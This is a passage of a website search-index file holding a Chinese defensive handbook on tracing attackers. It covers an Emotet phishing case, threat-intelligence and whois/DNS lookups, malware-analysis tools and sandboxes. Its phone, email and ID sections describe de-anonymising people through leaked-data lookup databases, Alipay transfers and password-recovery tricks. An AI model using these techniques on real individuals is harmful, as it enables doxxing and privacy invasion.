\u8bbf\u95ee\u8be5\u57df\u540d\u4f1a\u63d0\u793a\u6b64\u7f51\u7ad9\u4e3a\u9493\u9c7c\u7f51\u7ad9\u3002 \u70b9\u51fb\u94fe\u63a5\u4e0b\u8f7d\u5176\u4e2d\u75c5\u6bd2\u6587\u4ef6\u5e76\u8fdb\u884c\u5a01\u80c1\u60c5\u62a5\u5206\u6790\u3002 \u5bf9\u5176\u8bf7\u6c42\u7684IP\u5730\u5740\u8fdb\u884c\u60c5\u62a5\u6536\u96c6\u3002 \u53d1\u73b0\u5176\u4e3aEmotet\u94f6\u884c\u6728\u9a6c\u3002 2.\u672c\u5730\u6267\u884c\u6b64\u75c5\u6bd2\u6728\u9a6c\u901a\u8fc7\u5206\u6790\u6d41\u91cf\u53d1\u73b0\u5176\u6307\u5411\u4e24\u4e2a\u57df\u540d\u3002 \u5bf9\u6d41\u91cf\u4e2d\u7684\u57df\u540d\u5730\u5740\u8fdb\u884c\u6eaf\u6e90\u5206\u6790 \u5176IP\u5730\u5740\u4e3aEmotet\u94f6\u884c\u6728\u9a6c\u5730\u5740\u3002 3.\u901a\u8fc7\u5206\u6790\u8be5\u75c5\u6bd2\u6728\u9a6c\u6587\u4ef6\uff0c\u53d1\u73b0\u5176Host\u6307\u5411\u56db\u4e2aIP\u5730\u5740\u5176\u4e2d\u5305\u542bEmotet\u94f6\u884c\u6728\u9a6c\u5730\u5740\u3002 \u901a\u8fc7\u767e\u5ea6\u8bcd\u6761\u53ef\u5f97\u77e5\uff0cEMOTET\u94f6\u884c\u6728\u9a6c\u5176\u4e3b\u8981\u901a\u8fc7\u5783\u573e\u90ae\u4ef6\u7684\u65b9\u5f0f\u8fdb\u884c\u4f20\u64ad\u3002 \u7ed3\u8bba\uff1a \u6839\u636e\u4ee5\u4e0a\u7ebf\u7d22\u63a8\u65ad\u5206\u6790\uff0c\u6b64\u4e8b\u4ef6\u4e3a\u5883\u5916\u9ed1\u4ea7\u56e2\u4f19\u4f20\u64adEmotet\u94f6\u884c\u6728\u9a6c\u7684\u9493\u9c7c\u90ae\u4ef6\u653b\u51fb\uff0c\u5c1d\u8bd5\u5bf9\u653b\u51fb\u8005\u8fdb\u884c\u6eaf\u6e90\u53cd\u5236\u53d1\u73b0\u5176\u76f8\u5173\u7ad9\u70b9\u4e3a\u6d6e\u52a8\u53d8\u5316\u7ad9\u70b9\u3002\u672a\u80fd\u6709\u8fdb\u4e00\u6b65\u53d1\u73b0\u3002","title":"\u6eaf\u6e90\u624b\u518c"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_1","text":"\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u63a5\u5230\u6eaf\u6e90\u4efb\u52a1\u65f6\uff0c\u83b7\u5f97\u7684\u4fe1\u606f\u5982\u4e0b \u653b\u51fb\u65f6\u95f4\\ \u653b\u51fbIP\\ \u9884\u8b66\u5e73\u53f0\\ \u653b\u51fb\u7c7b\u578b\\ \u6076\u610f\u6587\u4ef6\\ \u53d7\u653b\u51fb\u57df\u540d/IP \u5176\u4e2d\u653b\u51fbIP\u3001\u653b\u51fb\u7c7b\u578b\u3001\u6076\u610f\u6587\u4ef6\u3001\u653b\u51fb\u8be6\u60c5\u662f\u6eaf\u6e90\u5165\u624b\u7684\u70b9\u3002 \u901a\u8fc7\u653b\u51fb\u7c7b\u578b\u5206\u6790\u653b\u51fb\u8be6\u60c5\u7684\u8bf7\u6c42\u5305\uff0c\u770b\u6709\u6ca1\u6709\u653b\u51fb\u8005\u7279\u5f81\uff0c\u901a\u8fc7\u83b7\u53d6\u5230\u7684IP\u5730\u5740\u8fdb\u884c\u5a01\u80c1\u60c5\u62a5\u67e5\u8be2\u6765\u5224\u65ad\u6240\u7528\u7684IP\u5177\u4f53\u662f\u4ee3\u7406IP\u8fd8\u662f\u771f\u5b9eIP\u5730\u5740\u3002 \u5982\u7aef\u53e3\u626b\u63cf\u5927\u6982\u7387\u4e3a\u4e2a\u4ebavps\u6216\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\uff0c\u5728\u63a5\u5230\u5927\u91cf\u6eaf\u6e90\u4efb\u52a1\u65f6\u53ef\u4f18\u5148\u6eaf\u6e90\u3002 \u5982\u547d\u4ee4\u6267\u884c\u5927\u6982\u7387\u4e3a\u672a\u7ecf\u4efb\u4f55\u9690\u533f\u7684\u7f51\u7edc\u3001\u79fb\u52a8\u7f51\u7edc\u3001\u63a5\u5230\u811a\u672c\u626b\u63cf\u4efb\u52a1\u7684\u8089\u9e21\uff0c\u5728\u63a5\u5230\u5927\u91cf\u6eaf\u6e90\u4efb\u52a1\u65f6\u53ef\u4f18\u5148\u6eaf\u6e90\u3002 \u5982\u722c\u866b\u5927\u6982\u7387\u4e3a\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\uff0c\u53ef\u653e\u5230\u6700\u540e\u6eaf\u6e90\u3002 \u5982\u6076\u610f\u6587\u4ef6\u53ef\u83b7\u5f97c2\u5730\u5740\u3001\u672a\u5220\u9664\u7684\u5e26\u6709\u654f\u611f\u4fe1\u606f\u7684\u4ee3\u7801\uff08\u5982\u5e38\u7528ID\u3001\u7ec4\u7ec7\u4fe1\u606f\uff09\u3001\u6301\u7eed\u5316\u63a7\u5236\u4ee3\u7801\uff08C2\u5730\u5740\u6307\u5728APT\u653b\u51fb\u91cc\u7684\u547d\u4ee4\u4e0e\u63a7\u5236\uff0c\u82e5\u83b7\u53d6\u5230C2\u5730\u5740\u53ef\u4ee5\u4f7f\u6211\u4eec\u7684\u6eaf\u6e90\u76ee\u6807\u66f4\u6709\u9488\u5bf9\u6027\uff09 \u6301\u7eed\u5316\u63a7\u5236\u4ee3\u7801\u9700\u8981\u8be6\u7ec6\u5206\u6790\uff0c\u5982\u91c7\u7528DGA\u57df\u540d\u4e0a\u7ebf\u7684\u65b9\u6cd5\uff0c\u5206\u6790\u51fa\u57df\u540d\u7b97\u6cd5\uff0c\u9884\u6d4b\u4e4b\u540e\u7684\u57df\u540d\u53ef\u6709\u6548\u51cf\u5c11\u635f\u5931\uff0c\u589e\u52a0\u6eaf\u6e90\u9762\u3002","title":"\u6280\u5de7\u7bc7"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_2","text":"\u5728\u53d7\u5230\u653b\u51fb\u3001\u626b\u63cf\u4e4b\u540e\uff0c\u8fdb\u884c\u4e00\u7cfb\u5217\u6eaf\u6e90\u64cd\u4f5c\u540e\uff0c\u7406\u60f3\u60c5\u51b5\u4e0b\u60f3\u8981\u83b7\u5f97\u5982\u4e0b\u6570\u636e\uff0c\u6765\u523b\u753b\u653b\u51fb\u8005\u753b\u50cf\u3002 \u59d3\u540d/ID\uff1a\\ \u653b\u51fbIP\uff1a\\ \u5730\u7406\u4f4d\u7f6e\uff1a\\ QQ:\\ \u5fae\u4fe1\uff1a\\ \u90ae\u7bb1\uff1a\\ \u624b\u673a\u53f7\uff1a\\ \u652f\u4ed8\u5b9d\uff1a\\ IP\u5730\u5740\u6240\u5c5e\u516c\u53f8\uff1a\\ IP\u5730\u5740\u5173\u8054\u57df\u540d\uff1a\\ \u5176\u4ed6\u793e\u4ea4\u8d26\u53f7\u4fe1\u606f\uff08\u5982\u5fae\u535a/src/id\u8bc1\u660e\uff09\uff1a\\ \u4eba\u7269\u7167\u7247\uff1a\\ \u8df3\u677f\u673a\uff08\u53ef\u9009\uff09\uff1a\\ \uff08ps\uff1a\u4ee5\u4e0a\u4e3a\u6700\u7406\u60f3\u7ed3\u679c\u60c5\u51b5\uff0c\u6eaf\u6e90\u5230\u540d\u5b57\u516c\u53f8\u52a0\u5206\u6700\u9ad8\uff09 \u5728\u5199\u6eaf\u6e90\u62a5\u544a\u65f6\uff0c\u5e94\u907f\u514d\u5355\u4e00\u9762\u77f3\u9524\uff0c\u9700\u8981\u53cd\u590d\u9a8c\u8bc1\uff0c\u907f\u514d\u4e2d\u9014\u6eaf\u6e90\u9519\u4eba\uff0c\u5404\u4e2a\u6eaf\u6e90\u7ebf\u7d22\u53ef\u4ee5\u4e32\u8d77\u6765\uff0c\u8981\u5177\u6709\u903b\u8f91\u6027\u3002","title":"\u6eaf\u6e90\u7ed3\u679c\u6846\u67b6"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_3","text":"\u672c\u8282\u5c06\u6309\u7167\u83b7\u53d6\u5230\u7684\u6570\u636e\u5c55\u5f00\u5206\u6765\u6765\u8bb2\uff0c\u6700\u540e\u53ef\u80fd\u878d\u4f1a\u8d2f\u901a\uff0c\u4e92\u76f8\u9002\u7528\u3002 \u5a01\u80c1\u60c5\u62a5\u5e73\u53f0 https://x.threatbook.cn/ \\ https://ti.qianxin.com/ \\ https://ti.360.cn/ \\ https://www.venuseye.com.cn/ \u4e0d\u8981\u8fc7\u4e8e\u4f9d\u8d56\u5a01\u80c1\u60c5\u62a5\uff0c\u4ec5\u4f9b\u53c2\u8003 \u5e73\u53f0\u5927\u591a\u4e3a\u793e\u533a\u7ef4\u62a4\uff0c\u5b58\u5728\u8bef\u62a5\u4ee5\u53ca\u65f6\u6548\u6027\u95ee\u9898\uff0c\u53ef\u80fd\u6700\u540e\u8ddf\u771f\u6b63\u653b\u51fb\u8005\u6beb\u65e0\u5173\u7cfb\u3002","title":"\u6eaf\u6e90\u5e38\u7528\u624b\u6cd5"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_4","text":"","title":"\u5df2\u77e5\u57df\u540d\u83b7\u53d6\u4fe1\u606f"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#whois","text":"\u901a\u8fc7\u5a01\u80c1\u60c5\u62a5\u5e73\u53f0\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u57df\u540d\u89e3\u6790\u8bb0\u5f55\u3001\u5386\u53f2whois\u3001\u5b50\u57df\u540d\u3001SSL\u8bc1\u4e66\u7b49\u5982\u56fe\uff1a https://whois.chinaz.com/reverse?ddlSearchMode=4 https://community.riskiq.com/ \u53ef\u83b7\u5f97 ID \u59d3\u540d \u90ae\u7bb1","title":"\u5386\u53f2whois"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#ssl","text":"\u53ef\u83b7\u5f97 ID \u90ae\u7bb1","title":"SSL\u8bc1\u4e66"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_5","text":"\u901a\u8fc7\u89e3\u6790\u8bb0\u5f55\u53ef\u4ee5\u83b7\u5f97\u57df\u540dA\u8bb0\u5f55\u4ece\u800c\u83b7\u53d6\u5230\u57df\u540d\u540e\u7684IP\u5730\u5740\u3002 A\u8bb0\u5f55 ------ \u6620\u5c04\u57dfbai\u540d\u5230\u4e00\u4e2a\u6216\u591a\u4e2aIP CNAME------ \u6620\u5c04\u57df\u540d\u5230\u53e6\u4e00\u4e2a\u57df\u540d\uff08\u5b50\u57df\u540d\uff09 \u57df\u540d\u89e3\u6790\u8bb0\u5f55\uff1a http://www.jsons.cn/nslookup/ \u5168\u7403ping\uff0c\u67e5\u770b\u73b0\u7ed1\u5b9aip\uff0c\u770b\u662f\u5426\u57df\u540d\u4f7f\u7528\u4e86CDN\u6280\u672f\u3002 http://ping.chinaz.com/ fofa","title":"\u89e3\u6790\u8bb0\u5f55"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#ip","text":"","title":"\u5df2\u77e5IP\u83b7\u53d6\u4fe1\u606f"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_6","text":"\u5a01\u80c1\u60c5\u62a5\u5e73\u53f0 https://www.ipip.net/ip.html https://www.aizhan.com/ https://www.whois.com/","title":"\u53cd\u67e5\u57df\u540d"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#ip_1","text":"\u5a01\u80c1\u60c5\u62a5\u5e73\u53f0 https://www.ipip.net/ http://ipwhois.cnnic.net.cn/index.jsp \u53ef\u83b7\u5f97 \u662f\u5426\u4e3a\u79fb\u52a8\u7f51\u7edc\u3001IDC\u7b49 IP\u6bb5\u6240\u5c5e\u516c\u53f8","title":"IP\u4fe1\u606f"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#ip_2","text":"https://chaipip.com/ https://www.opengps.cn/Data/IP/ipplus.aspx","title":"IP\u5b9a\u4f4d"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#id","text":"","title":"\u5df2\u77e5ID/\u59d3\u540d/\u624b\u673a\u53f7/\u90ae\u7bb1\u83b7\u53d6\u4fe1\u606f"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_7","text":"sgk \u67e5\u652f\u4ed8\u5b9d\u8f6c\u8d26\uff0c\u9a8c\u8bc1\u59d3\u540d\u3002 \u901a\u8fc7\u90e8\u5206\u5e73\u53f0\u8d26\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u53ef\u731c\u624b\u673a\u53f7\u3002 QQ\u6dfb\u52a0\u597d\u53cb\u641c\u7d22 \u5fae\u4fe1\u6dfb\u52a0\u597d\u53cb\u641c\u7d22 https://www.reg007.com/ \u793e\u4ea4\u5e73\u53f0\u67e5\u627e\uff08\u6296\u97f3\u3001\u8109\u8109\u641c\u7d22\u7b49\uff09","title":"\u624b\u673a\u53f7/\u90ae\u7bb1"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#id_1","text":"sgk \u8c37\u6b4c/\u767e\u5ea6 src\u641c\u7d22 \u5fae\u535a\u641c\u7d22 \u8d34\u5427\u641c\u7d22 \u793e\u4ea4\u5e73\u53f0\u67e5\u627e\uff08\u6296\u97f3\u3001\u8109\u8109\u641c\u7d22\u7b49\uff09","title":"ID/\u59d3\u540d"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_8","text":"\u6076\u610f\u6587\u4ef6\u901a\u5e38\u4f1a\u4ece\u90ae\u4ef6\u7684\u8def\u5f84\u83b7\u5f97\uff0c\u53ef\u4ee5\u5c06\u90ae\u4ef6\u5168\u683c\u5f0f\u4fdd\u5b58\uff0c\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u67e5\u770b\uff0c\u53ef\u4ee5\u83b7\u5f97\u53d1\u9001\u90ae\u4ef6IP\u5730\u5740\u3002","title":"\u6076\u610f\u6587\u4ef6"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_9","text":"","title":"\u9700\u8981\u51c6\u5907\u7684\u5de5\u5177"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_10","text":"Ida JEB \u6587\u4ef6\u7f16\u8f91\u7c7b 010 editor Winhex","title":"\u9006\u5411\u7c7b"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_11","text":"processmonitor Wireshark \u79d1\u6765\u7f51\u7edc\u5206\u6790\u7cfb\u7edf SRsniffer","title":"\u7f51\u7edc\u3001\u8fdb\u7a0b\u76d1\u63a7\u7c7b"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_12","text":"Binwalk BIN2BMP PIXD","title":"\u56fa\u4ef6\u5206\u6790\u7c7b"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_13","text":"\u5fae\u6b65\u4e91\u6c99\u7bb1 https://s.threatbook.cn/ \u5947\u5b89\u4fe1\u4e91\u6c99\u7bb1 https://sandbox.ti.qianxin.com/sandbox/page \u817e\u8baf\u54c8\u52c3 https://habo.qq.com/ Joe Sandbox\uff1a https://www.joesandbox.com/","title":"\u5728\u7ebf\u6c99\u7bb1"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_14","text":"","title":"\u5e38\u89c4\u6eaf\u6e90\u624b\u6cd5"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_15","text":"\u5e38\u89c1\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u683c\u5f0f\u6709PE\uff0cELF\uff0cMACH-O\u7b49\uff0c\u4e0d\u540c\u7684\u683c\u5f0f\u6709\u4e0d\u540c\u7684\u6807\u5fd7\u4fe1\u606f\uff08\u53c2\u8003\u7406\u8bba\u7bc7\uff09\uff0c\u77e5\u9053\u4e86\u76ee\u6807\u6587\u4ef6\u7684\u683c\u5f0f\u540e\u624d\u80fd\u786e\u5b9a\u5bf9\u5e94\u7684\u5206\u6790\u65b9\u6cd5\u548c\u5206\u6790\u5de5\u5177\u3002 \u53ef\u4ee5\u4f7f\u752816\u8fdb\u5236\u89e3\u6790\u5668\u8f7d\u5165\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u7136\u540e\u67e5\u770b\u662f\u54ea\u79cd\u7c7b\u578b\u7684\u6587\u4ef6\u3002 \u4e00\u822c\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u524d\u56db\u4e2a\u5b57\u8282\u4e3a\u6587\u4ef6\u683c\u5f0f\u7684magic\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ece\u7f51\u7edc\u641c\u7d22\u83b7\u5f97\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u6216\u8005\u4f7f\u7528\u76f8\u5173\u7684\u5de5\u5177\uff08PEID\uff0cfile\uff09\u7b49\u8fdb\u884c\u81ea\u52a8\u8bc6\u522b\u3002","title":"\u6587\u4ef6\u8bc6\u522b"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_16","text":"\u54c8\u5e0c\u662f\u4e00\u79cd\u7528\u6765\u552f\u4e00\u6807\u8bc6\u76ee\u6807\u7a0b\u5e8f\u7684\u5e38\u7528\u65b9\u6cd5\u3002\u76ee\u6807\u7a0b\u5e8f\u901a\u8fc7\u4e00\u4e2a\u54c8\u5e0c\u7b97\u6cd5\uff0c\u4f1a\u4ea7\u751f\u51fa\u4e00\u6bb5\u552f\u4e00\u7684\u7528\u4e8e\u6807\u8bc6\u8fd9\u4e2a\u6837\u672c\u7684\u54c8\u5e0c\u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u503c\u7406\u89e3\u4e3a\u662f\u76ee\u6807\u7a0b\u5e8f\u7684\u6307\u7eb9\u3002\u5e38\u7528\u7684\u54c8\u5e0c\u7b97\u6cd5\u6709MD5\u3001Sha-1\u4ee5\u53caCRC32\u7b49\u3002\u7531\u4e8e\u4ec5\u4ec5\u91c7\u7528\u4e00\u79cd\u7b97\u6cd5\uff0c\u7279\u522b\u662fMD5\u7b97\u6cd5\uff0c\u6709\u53ef\u80fd\u4f7f\u5f97\u4e0d\u540c\u7a0b\u5e8f\u4ea7\u751f\u540c\u6837\u7684\u54c8\u5e0c\u7ed3\u679c\uff0c\u6240\u4ee5\u4e00\u822c\u4f1a\u8fd0\u7528\u591a\u79cd\u54c8\u5e0c\u9a8c\u8bc1\u6587\u4ef6\u7684\u552f\u4e00\u6027\u3002","title":"\u8ba1\u7b97\u54c8\u5e0c\u503c"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_17","text":"\u7a0b\u5e8f\u4e2d\u7684\u5b57\u7b26\u4e32\u5c31\u662f\u4e00\u4e32\u53ef\u6253\u5370\u7684\u5b57\u7b26\u5e8f\u5217\uff0c\u4e00\u4e2a\u7a0b\u5e8f\u901a\u5e38\u90fd\u4f1a\u5305\u542b\u4e00\u4e9b\u5b57\u7b26\u4e32\uff0c\u6bd4\u5982\u6253\u5370\u8f93\u51fa\u4fe1\u606f\u3001\u8fde\u63a5\u7684URL\uff0c\u6216\u8005\u662f\u7a0b\u5e8f\u6240\u8c03\u7528\u7684API\u51fd\u6570\u7b49\u3002\u4ece\u5b57\u7b26\u4e32\u4e2d\u8fdb\u884c\u641c\u7d22\u662f\u83b7\u53d6\u7a0b\u5e8f\u529f\u80fd\u63d0\u793a\u7684\u4e00\u79cd\u7b80\u5355\u65b9\u6cd5\u3002\uff08\u5728IDA\u548cOD\u4e2d\u90fd\u53ef\u4ee5\u67e5\u627e\u5b57\u7b26\u4e32\uff09\u5e76\u4e0d\u662f\u6240\u6709\u7684\u5b57\u7b26\u4e32\u90fd\u662f\u6709\u610f\u4e49\u7684\uff0c\u4f46\u662f\u5229\u7528\u8fd9\u4e2a\u7ed3\u679c\uff0c\u4e5f\u80fd\u591f\u7ed9\u6211\u4eec\u7684\u9759\u6001\u5206\u6790\u5e26\u6765\u5f88\u5927\u7684\u4fbf\u5229\u4e86\u3002","title":"\u67e5\u627e\u5b57\u7b26\u4e32"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_18","text":"\u5982\u679c\u8f6f\u4ef6\u88ab\u52a0\u58f3\u7684\u8bdd\uff0c\u90a3\u4e48\u5bfc\u5165\u8868\u4e2d\u7684\u51fd\u6570\u4f1a\u5f88\u5c11\uff0c\u6240\u4ee5\u53ef\u4ee5\u4ece\u8fd9\u91cc\u5224\u65ad\u6587\u4ef6\u662f\u5426\u88ab\u52a0\u58f3\u3002\u5982\u679c\u6ca1\u6709\u52a0\u58f3\uff0c\u90a3\u4e48\u5bfc\u5165\u8868\u4e2d\u4f1a\u5217\u51fa\u7a0b\u5e8f\u4f7f\u7528\u7684\u5927\u90e8\u5206\u51fd\u6570\uff08\u9664\u53bb\u7a0b\u5e8f\u52a8\u6001\u83b7\u5f97\u7684\uff09\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u51fd\u6570\u5927\u81f4\u5224\u65ad\u4e00\u4e0b\u7a0b\u5e8f\u7684\u884c\u4e3a\u3002","title":"\u67e5\u627e\u5bfc\u5165\u51fd\u6570"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_19","text":"\u4f7f\u7528IDA\u53cd\u6c47\u7f16\u7a0b\u5e8f\u7684\u65f6\u5019\uff0cIDA\u5e76\u4e0d\u4f1a\u5c06\u5b8f\u7684\u540d\u5b57\u89e3\u6790\u51fa\u6765\uff0c\u76f8\u53cd\uff0c\u5b83\u53ea\u4f1a\u4f7f\u7528\u5b8f\u5bf9\u5e94\u7684\u6570\u5b57\u8fdb\u884c\u663e\u793a\uff0c\u5982\u4e0b\u5982\u6240\u793a\uff1a \u5982\u679c\u53ea\u770b\u8fd9\u4e9b\u6570\u5b57\uff0c\u5b8c\u5168\u65e0\u6cd5\u5f97\u77e5\u4ec0\u4e48\u60c5\u51b5\uff0c\u597d\u5728IDA\u63d0\u4f9b\u4e86\u89e3\u6790\u673a\u5236\uff0c\u53ef\u4ee5\u5c06\u6570\u5b57\u8f6c\u6362\u4e3a\u5b8f\u540d\u3002\u5728\u5bf9\u5e94\u7684\u6570\u5b57\u4e0a\u53f3\u952e\uff0c\u9009\u62e9Enum\uff1a \u7136\u540e\u5728\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\u4e2d\u9009\u62e9\u5bf9\u5e94\u7684\u5b8f\u5373\u53ef \u66ff\u6362\u540e\u7684\u7ed3\u679c\u5982\u4e0b\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u65b9\u4fbf\u4e86\u9759\u6001\u67e5\u770b\u4ee3\u7801","title":"\u89e3\u6790\u5b8f"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_20","text":"\u75c5\u6bd2\u6728\u9a6c\u7f16\u5199\u8005\u7ecf\u5e38\u4f1a\u4f7f\u7528\u52a0\u58f3\u6280\u672f\u6765\u8ba9\u4ed6\u4eec\u7684\u6076\u610f\u7a0b\u5e8f\u96be\u4ee5\u88ab\u68c0\u6d4b\u6216\u5206\u6790\u3002\u6b63\u5e38\u7684\u7a0b\u5e8f\u603b\u662f\u4f1a\u5305\u542b\u5f88\u591a\u5b57\u7b26\u4e32\u3002\u800c\u52a0\u4e86\u58f3\u7684\u6076\u610f\u4ee3\u7801\u901a\u8fc7\u5206\u6790\u6240\u5f97\u5230\u7684\u53ef\u6253\u5370\u5b57\u7b26\u4e32\u5c31\u4f1a\u5f88\u5c11\u3002\u5982\u679c\u67e5\u627e\u51fa\u7684\u7a0b\u5e8f\u7684\u5b57\u7b26\u4e32\u5f88\u5c11\u65f6\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7a0b\u5e8f\u5c31\u5f88\u6709\u53ef\u80fd\u662f\u52a0\u4e86\u58f3\u7684\u3002\u6b64\u65f6\u5f80\u5f80\u5c31\u9700\u8981\u4f7f\u7528\u5176\u5b83\u65b9\u6cd5\u6765\u8fdb\u4e00\u6b65\u68c0\u6d4b\u5b83\u4eec\u7684\u884c\u4e3a\u3002(\u5e38\u7528PEiD\u8fdb\u884c\u67e5\u58f3)","title":"\u4fa6\u58f3\u64cd\u4f5c"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_21","text":"\u4f7f\u7528\u8c03\u8bd5\u5668\u5bf9\u75c5\u6bd2\u8fdb\u884c\u5206\u6790\u5728\u53cd\u75c5\u6bd2\u5de5\u4f5c\u4e2d\u626e\u6f14\u7740\u5341\u5206\u91cd\u8981\u7684\u89d2\u8272\u3002\u8c03\u8bd5\u5668\u5141\u8bb8\u4f60\u67e5\u770b\u4efb\u610f\u5185\u5b58\u5730\u5740\u7684\u5185\u5bb9\u3001\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u4ee5\u53ca\u6bcf\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u3002\u8c03\u8bd5\u5668\u4e5f\u5141\u8bb8\u4f60\u5728\u4efb\u610f\u65f6\u523b\u6539\u53d8\u5173\u4e8e\u7a0b\u5e8f\u6267\u884c\u7684\u4efb\u4f55\u4e1c\u897f\u3002\u6bd4\u5982\u4f60\u53ef\u4ee5\u5728\u4efb\u610f\u65f6\u523b\u6539\u53d8\u4e00\u4e2a\u53d8\u91cf\u7684\u503c------\u524d\u63d0\u662f\u4f60\u9700\u8981\u83b7\u5f97\u5173\u4e8e\u8fd9\u4e2a\u53d8\u91cf\u8db3\u591f\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e\u3002\u5728\u5b9e\u9645\u7684\u52a8\u6001\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\uff0c\u6700\u5e38\u7528\u7684\u662fOllyDBG\u548cWinDbg\uff0c\u524d\u8005\u662f\u75c5\u6bd2\u5206\u6790\u4eba\u5458\u4f7f\u7528\u6700\u591a\u7684\u8c03\u8bd5\u5668\uff0c\u7f3a\u70b9\u662f\u4e0d\u652f\u6301\u5185\u6838\u8c03\u8bd5\uff0c\u5982\u679c\u60f3\u8c03\u8bd5\u5185\u6838\uff0cWinDbg\u57fa\u672c\u4e0a\u5c31\u662f\u552f\u4e00\u7684\u9009\u62e9\u4e86\u3002\u867d\u7136IDA Pro\u4e5f\u80fd\u591f\u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\uff0c\u4f46\u662f\u5b83\u8fdc\u8fdc\u4e0d\u5982OD\u65b9\u4fbf\u3002\u56e0\u6b64\u5728\u5b9e\u9645\u5206\u6790\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5f80\u5f80\u662f\u5c06\u4e8c\u8005\u7ed3\u5408\u4f7f\u7528\u7684\u3002\u56e0\u4e3a\u5982\u679c\u7528IDA 